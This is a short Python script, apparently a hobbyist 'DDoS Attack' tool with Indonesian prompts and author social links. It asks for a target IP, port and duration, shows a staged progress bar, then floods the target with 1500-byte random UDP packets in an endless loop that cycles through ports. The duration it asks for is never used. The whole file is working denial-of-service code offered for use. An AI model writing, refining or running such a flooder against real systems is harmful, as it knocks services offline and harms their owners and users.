import sys
import os
import time
import socket
import random
import pyfiglet
import time
from googletrans import Translator
from datetime import datetime
from datetime import date

translator = Translator()

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1500)
#############

os.system("clear")
os.system("figlet DDos Attack")
  
result = pyfiglet.figlet_format("Xnuvers", font = "dotmatrix" ) 
print(result)
print ('\n')

hari_ini = datetime.now()
tanggal = hari_ini.strftime('%d, %m, %y')
print ('tanggal = ', tanggal)

saat_ini = datetime.now()
jam = saat_ini.strftime('%H:%M:%S')
print('Jam:', jam)

print ("|-------------------------------------|")
print ("| Author   : XNUVERS007               |")
print ("| You Tube : https://bit.ly/Xnuvers   |")
print ("| github   : https://bit.ly/Xnuvrs1   |")
print ("| Facebook : https://bit.ly/Fesbuck   |")
print ("| Instagram: https://bit.ly/Xnvrs13   |")
print ("| Site     : http://bit.ly/Mykingbee  |")
print ("|-------------------------------------|")
print ('\n')

print ("/////////////////////////////////////////////////////////////////")
x = translator.translate('1. Masukan Target ip Tujuan (Contoh 74.125.200.138) : ', src='id', dest='en')

print (x.text)
ip = input('1. Masukan Target ip Tujuan (Contoh 74.125.200.138) : ')
print ('\n')
n = translator.translate('2. Masukan port Tujuan (contoh 8080, 8844, 443(https), 80(http) : ', src='id', dest='en')

print (n.text)
port = int(input('2. Masukan port Tujuan (contoh 8080, 8844, 443(https), 80(http) : '))
print ('\n')
v = translator.translate('3. jumlah detik untuk mengirim paket (DDOS) : ', src='id', dest='en')

print (v.text)
duration = int(input('3. jumlah detik untuk mengirim paket (DDOS) : '))
print ("/////////////////////////////////////////////////////////////////")

os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
